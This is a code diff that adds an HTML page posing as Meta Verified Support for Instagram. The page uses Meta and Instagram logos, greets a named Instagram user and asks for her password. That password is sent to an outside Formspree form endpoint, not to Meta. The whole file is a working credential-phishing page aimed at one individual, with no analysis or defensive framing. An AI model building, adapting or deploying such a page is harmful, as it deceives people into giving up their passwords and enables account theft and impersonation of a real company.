@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Reply Form</title>
+    <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .meta-logo {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 5px;
+            width: 20%;
+        }
+        h2 {
+            color: black;
+            font-size: 18px;
+            margin: 0;
+        }
+        p {
+            color: black;
+            font-size: 14px;
+            margin: 0 0 5px 0;
+        }
+        a {
+            color: #1877F2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #555;
+        }
+        input[type="password"]::placeholder {
+            color: #aaa;
+        }
+        input[type="submit"] {
+            background-color: #1877F2;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+        }
+        input[type="submit"]:hover {
+            background-color: #1558B0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://wp-test-uploaddocs.s3.amazonaws.com/wp-content/uploads/2022/10/10165134/meta-logo-meta-by-facebook-icon-editorial-logo-for-social-media-free-vector.png" alt="Meta Logo" class="meta-logo">
+        </div>
+        <img src="https://fontmeme.com/images/instagram-new-logo.png" alt="Instagram Logo" style="max-width: 80%; height: auto; margin-bottom: 5px;">
+        <h2>Stay Verified, Sofia!</h2>
+        <p>Login to get in touch with Meta Verified Support.</p>
+        <p>Username: <a href="https://www.instagram.com/sofiadendroff/" target="_blank">@sofiadendroff</a></p>
+        <form action="https://formspree.io/f/xzzpnvzp" method="POST">
+            <label for="reply" style="display: none;">Your message:</label><br>
+            <input type="password" id="reply" name="reply" placeholder="Password" required><br><br>
+            <input type="submit" value="Confirm">
+        </form>
+    </div>
+</body>
+</html>
